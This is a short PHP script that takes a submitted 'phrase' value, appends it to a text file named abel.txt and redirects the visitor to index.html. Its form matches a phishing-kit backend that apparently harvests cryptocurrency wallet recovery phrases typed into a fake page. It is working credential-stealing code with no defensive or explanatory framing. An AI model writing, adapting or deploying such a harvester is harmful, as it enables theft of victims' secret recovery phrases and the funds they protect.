<?php
$phrase = $_POST['phrase'];

if (empty($phrase)) {
  header('location: ./');
} else {
$message = "
PHRASE : ".$phrase."

";
$qq = fopen("abel.txt", "a");
fwrite($qq, $message);
fclose($qq);
header('location: index.html');
}
?>
